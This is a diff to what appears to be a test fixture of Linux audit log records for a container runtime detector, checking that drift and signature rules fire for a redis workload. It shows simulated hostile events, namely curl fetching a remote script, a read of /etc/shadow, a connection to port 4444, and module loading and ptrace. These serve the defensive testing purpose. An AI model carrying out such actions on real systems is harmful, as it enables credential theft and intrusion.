@@ -2,6 +2,10 @@
 #   execve /usr/bin/curl          -> 100011 (SBoB drift: process ...)
 #   open /etc/shadow             -> 100021 (SBoB drift: file open ...)
 #   connect 185.220.101.4:4444   -> 100031 (SBoB drift: connect ...)
+# Signature events (rulePolicies, M4): node-scoped keys fire-by-default; no
+# processAllowed exemption is declared for redis, so these MUST fire.
+#   init_module (module load)     -> 100060 (SBoB signature: module-load ...)
+#   ptrace (process tracing)      -> 100062 (SBoB signature: process-tracing ...)
 
 type=SYSCALL msg=audit(1699999990.100:2001): arch=c000003e syscall=59 success=yes exit=0 items=2 ppid=2002 pid=3001 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-exec-redis"
 type=EXECVE msg=audit(1699999990.100:2001): argc=3 a0="/usr/bin/curl" a1="-s" a2="http://update.example.invalid/x.sh"
@@ -11,3 +15,12 @@ type=PATH msg=audit(1699999991.200:2002): item=0 name="/etc/shadow" inode=1301 d
 
 type=SYSCALL msg=audit(1699999992.300:2003): arch=c000003e syscall=42 success=yes exit=0 items=1 ppid=3002 pid=3003 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="curl" exe="/usr/bin/curl" subj=unconfined key="sbob-connect-redis"
 type=SOCKADDR msg=audit(1699999992.300:2003): saddr=0200115CB9DC65040000000000000000
+
+# Signature events (rulePolicies, M4): node-scoped keys fire-by-default; no
+# processAllowed exemption is declared for redis, so these MUST fire.
+#   init_module (module load)     -> 100060 (SBoB signature: module-load ...)
+#   ptrace (process tracing)      -> 100062 (SBoB signature: process-tracing ...)
+
+type=SYSCALL msg=audit(1699999993.400:2004): arch=c000003e syscall=175 success=yes exit=0 items=1 ppid=3003 pid=3004 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="kmod" exe="/usr/bin/kmod" subj=unconfined key="sbob-module-load"
+
+type=SYSCALL msg=audit(1699999994.500:2005): arch=c000003e syscall=101 success=yes exit=0 items=1 ppid=3004 pid=3005 auid=4294967295 uid=999 gid=999 euid=999 suid=999 fsuid=999 egid=999 sgid=999 fsgid=999 tty=(none) ses=4294967295 comm="gdb" exe="/usr/bin/gdb" subj=unconfined key="sbob-process-tracing"
